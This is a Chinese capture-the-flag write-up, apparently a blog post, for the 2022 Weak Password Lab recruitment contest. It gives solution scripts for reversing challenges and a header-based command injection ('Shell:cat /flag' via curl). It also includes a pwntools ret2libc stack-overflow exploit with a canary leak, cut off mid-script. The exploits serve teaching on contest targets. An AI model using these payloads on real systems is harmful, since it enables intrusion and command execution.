<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">f=<span class="keyword">lambda</span> k:<span class="string">&#x27;qsnctf&#123;&#x27;</span>+<span class="built_in">str</span>(k)+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">k=<span class="number">1000000</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	m = hashlib.md5(f(k).encode())</span><br><span class="line">	<span class="keyword">if</span> m.hexdigest()==<span class="string">&quot;a4241bbfc6cab40e5b36b7a98c8621ed&quot;</span>:</span><br><span class="line">		<span class="built_in">print</span>(f(k))</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="built_in">print</span>(k)</span><br><span class="line">	k+=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117164906271.png"></p>
<p>得到Flag为qsnctf{5201314}</p>
<p>当然更好的写法还有这样的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>,<span class="number">9999999</span>):</span><br><span class="line">	m = hashlib.md5((<span class="string">&#x27;qsnctf&#123;&#x27;</span>+<span class="built_in">str</span>(k)+<span class="string">&#x27;&#125;&#x27;</span>).encode())</span><br><span class="line">	<span class="keyword">if</span> m.hexdigest()==<span class="string">&quot;a4241bbfc6cab40e5b36b7a98c8621ed&quot;</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;qsnctf&#123;&#x27;</span>+<span class="built_in">str</span>(k)+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="This-is"><a href="#This-is" class="headerlink" title="This..is"></a>This..is</h2><p>这道题可谓是非常有意思，一道Re题还需要Web环境</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117170638533.png"></p>
<p>下载附件，打开程序</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117170842468.png"></p>
<p>这个提示已经告诉我们了，我们的操作需要在Check后输入口令，并且发送和保存口令是不一样的。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117170916042.png"></p>
<p>应该是在URL中填充启动的容器链接，然后在Check中输入密码后保存这个URL。</p>
<p>最下方有个Shell，可能是考察了Web的命令执行。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117171352449.png"></p>
<p>IDA的字符串窗口，可以很好的告诉我们这里大概应该需要填充什么。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117171449712.png"></p>
<p>访问容器页面，是这样的</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117171515533.png"></p>
<p>Check密码为123456的时候，数据被成功保存。</p>
<p>题目描述中有说用户名是admin，密码是qsnctf2022_reverse</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117171620999.png"></p>
<p>发送的时候，提示我密码错误，也就是前面提到的保存密码和发送密码是不一样的。</p>
<p>那么尝试一下QSNCTF</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117171709229.png"></p>
<p>显示成功发送</p>
<p>那么shell中是空的，所以data没有内容</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117171738322.png"></p>
<p>Shell中写123，那么data中回显的也是123，这和字符串窗口中的<code>Shell:echo</code>关联很大。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117171840827.png"></p>
<p>中间有个base64的东西，我们解码看看</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117171920434.png"></p>
<p>Moxin1314Loveyou</p>
<p>既然他在这些请求关键字之间，那么很有可能这里是一个鉴权的关键。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117172023572.png"></p>
<p>不难发现，从F38到F8A应该是HTTP请求发送的内容，那么上面的是过滤字符，下面是信息框内容。</p>
<p>我们现在需要给一个HTTP请求，请求内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">请求方式：GET</span><br><span class="line">请求地址：题目地址/?username=admin&amp;password=qsnctf2022_reverse</span><br><span class="line">请求体包含：</span><br><span class="line">Shell:echo 123456</span><br><span class="line">Authorization:Moxin1314Loveyou</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure>

<p>那么我们一个CURL就可以解决，如果不习惯的话可以用Hackbar或者Burpsuite。</p>
<p>接着只需要修改Shell后的内容，就可以完成命令执行。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117172722105.png"></p>
<p>我们需要指定body</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117172908877.png"></p>
<p>得到Flag</p>
<p>最终Payload如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://a3db934d-1587-495b-9704-e6ca3be3cc11.recruit.qsnctf.com:8080/?username=admin&amp;password=qsnctf2022_reverse&quot;</span> -H <span class="string">&quot;Shell:cat /flag&quot;</span> -H <span class="string">&quot;Authorization:Moxin1314Loveyou&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="Tea"><a href="#Tea" class="headerlink" title="Tea"></a>Tea</h2><p>下载附件扔64IDA</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117173600877.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117173624051.png"></p>
<p>根据这里的几个循环运算和encrypt写解密脚本</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117173911134.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117173705497.png"></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">DWORD str2[<span class="number">32</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">46</span>,</span><br><span class="line">  <span class="number">162</span>,</span><br><span class="line">  <span class="number">154</span>,</span><br><span class="line">  <span class="number">93</span>,</span><br><span class="line">  <span class="number">216</span>,</span><br><span class="line">  <span class="number">119</span>,</span><br><span class="line">  <span class="number">117</span>,</span><br><span class="line">  <span class="number">77</span>,</span><br><span class="line">  <span class="number">224</span>,</span><br><span class="line">  <span class="number">124</span>,</span><br><span class="line">  <span class="number">80</span>,</span><br><span class="line">  <span class="number">69</span>,</span><br><span class="line">  <span class="number">114</span>,</span><br><span class="line">  <span class="number">165</span>,</span><br><span class="line">  <span class="number">248</span>,</span><br><span class="line">  <span class="number">93</span>,</span><br><span class="line">  <span class="number">109</span>,</span><br><span class="line">  <span class="number">14</span>,</span><br><span class="line">  <span class="number">98</span>,</span><br><span class="line">  <span class="number">20</span>,</span><br><span class="line">  <span class="number">102</span>,</span><br><span class="line">  <span class="number">95</span>,</span><br><span class="line">  <span class="number">216</span>,</span><br><span class="line">  <span class="number">91</span>,</span><br><span class="line">  <span class="number">138</span>,</span><br><span class="line">  <span class="number">93</span>,</span><br><span class="line">  <span class="number">196</span>,</span><br><span class="line">  <span class="number">200</span>,</span><br><span class="line">  <span class="number">116</span>,</span><br><span class="line">  <span class="number">32</span>,</span><br><span class="line">  <span class="number">253</span>,</span><br><span class="line">  <span class="number">101</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *A,<span class="type">unsigned</span> <span class="type">int</span> *B)</span></span>&#123;</span><br><span class="line"> <span class="type">int</span> j;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">int</span> v0 = A[<span class="number">0</span>],v1 = A[<span class="number">1</span>],delta = <span class="number">221492336</span>,sum = delta * <span class="number">32</span>;</span><br><span class="line"> <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">32</span>;j++)&#123;</span><br><span class="line"> </span><br><span class="line">  v1 -= (v0 + sum) ^ (B[<span class="number">2</span>] + <span class="number">16</span> * v0) ^ ((v0 &gt;&gt; <span class="number">5</span>) + B[<span class="number">3</span>]);</span><br><span class="line">  v0 -= (v1 + sum) ^ (*B + <span class="number">16</span> * v1) ^ ((v1 &gt;&gt; <span class="number">5</span>) + B[<span class="number">1</span>]);</span><br><span class="line">  sum -= delta;</span><br><span class="line"> &#125;</span><br><span class="line"> A[<span class="number">0</span>] = v0;</span><br><span class="line"> A[<span class="number">1</span>] = v1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, <span class="type">unsigned</span> <span class="type">int</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = *a1;</span><br><span class="line">  v5 = a1[<span class="number">1</span>];</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 += <span class="number">221492336</span>;</span><br><span class="line">    v6 += (v5 + v4) ^ (*a2 + <span class="number">16</span> * v5) ^ ((v5 &gt;&gt; <span class="number">5</span>) + a2[<span class="number">1</span>]);</span><br><span class="line">    v5 += (v6 + v4) ^ (a2[<span class="number">2</span>] + <span class="number">16</span> * v6) ^ ((v6 &gt;&gt; <span class="number">5</span>) + a2[<span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v6;</span><br><span class="line">  a1[<span class="number">1</span>] = v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v4[<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">24</span>; i &gt;= <span class="number">0</span>; i -= <span class="number">8</span> )</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">1</span>; ++j )</span><br><span class="line">     &#123;</span><br><span class="line">      v4[j]=<span class="number">0</span>;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">3</span>; k &gt;=<span class="number">0</span> ; --k )</span><br><span class="line">         &#123;</span><br><span class="line">    v4[j] = v4[j] &lt;&lt; <span class="number">8</span>;</span><br><span class="line">            v4[j] += str2[<span class="number">4</span> * j + i + k];</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     cout&lt;&lt;v4[<span class="number">0</span>]&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;v4[<span class="number">1</span>]&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">       <span class="built_in">decrypt</span>(&amp;v4[<span class="number">0</span>],key);</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">1</span>; ++j )</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= <span class="number">3</span>; ++k )</span><br><span class="line">         &#123;</span><br><span class="line">           str2[<span class="number">4</span> * j + i + k]=v4[j] ;</span><br><span class="line">           v4[j] = v4[j] &gt;&gt; <span class="number">8</span>;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">  cout&lt;&lt;<span class="built_in">char</span>(str2[i]);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解铃还须系铃人"><a href="#解铃还须系铃人" class="headerlink" title="解铃还须系铃人"></a>解铃还须系铃人</h2><p>程序32位，直接放到IDA32。但是ExeinfoPE查询到这是来自于“易语言”的程序，就不能再常规的跟踪main函数等了。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/clip_image001.png"></p>
<p>OD打开，发现调试的时候会报错，疑似是加了反调试等东西，我们通过ESP绕过，顺便脱个小混淆。</p>
<p>再Dump出文件。</p>
<p>说真的这种题貌似使用Ollydbg做题更刺激，但是IDA还是比较通用的。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/clip_image002.jpg" alt="img"></p>
<p>打开程序提示了Flag Code的内容，我们尝试Shift + F12</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/clip_image004.jpg" alt="img"></p>
<p>找到了箭头所指的位置</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/clip_image006.jpg" alt="img"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/clip_image008.jpg" alt="img"></p>
<p>跟到这里，然后我们看看这块代码是干什么用的。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/clip_image010.jpg" alt="img"></p>
<p>(上图截图有点失误，实际上40121B是一个取随机字符的过程)</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/clip_image011.png" alt="img"></p>
<p>这是程序的加密过程</p>
<p>Int a1是取得随机数值</p>
<p>123456疑似是个密钥</p>
<p>通过这里写相关解密内容</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/clip_image013.jpg" alt="img"></p>
<p>经常用易语言的，或许已经知道这是精易语言模块里的默认算法了。</p>
<p>将Flag Code解密</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/clip_image014.png" alt="img"></p>
<p>得到flag为flag{m0s1n_w0d1sh3n}</p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/1.png" alt="1"><br>看到有个伪随机数，绕过之后会进入back函数<br><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/2.png" alt="2"><br>back函数是一个命令执行，使用分号直接截断<br><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/3.png" alt="3">  </p>
<h2 id="stackoverflow"><a href="#stackoverflow" class="headerlink" title="stackoverflow"></a>stackoverflow</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/4.png" alt="4"><br>开了canary和NX<br><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/5.png" alt="5"><br>程序存在溢出，利用第一个read覆盖到canary末尾一字节，然后后面的printf泄露地址，然后溢出ret2libc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> ShellcodeMall</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;recruit.qsnctf.com&#x27;</span></span><br><span class="line">port = <span class="number">10067</span></span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *0x4012fe</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(binary)</span></span><br><span class="line">sh = remote(ip, port)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> sh.recvuntil(x, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sn</span>(<span class="params">x</span>): <span class="keyword">return</span> sh.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> sh.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> sh.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rv</span>(<span class="params">x</span>): <span class="keyword">return</span> sh.recv(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>): <span class="keyword">return</span> sh.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>): <span class="keyword">return</span> sh.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">a, b</span>): <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;\033[1;35m&#123;&#125; ==&gt; &#123;&#125;\033[0m&quot;</span>.<span class="built_in">format</span>((a), b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int2bytes</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(num).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>, content</span>):</span><br><span class="line">    sla()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sla()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sla()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000401393: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x0000000000401391: pop rsi; pop r15; ret;</span></span><br><span class="line"><span class="string">0x000000000040101a: ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401393</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000401391</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, gs)</span></span><br><span class="line">sla(<span class="string">b&#x27;Do you know who first discovered the stack overflow&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x58</span>)</span><br><span class="line">rl()</span><br><span class="line">rl()</span><br><span class="line">canary = u64(rv(<span 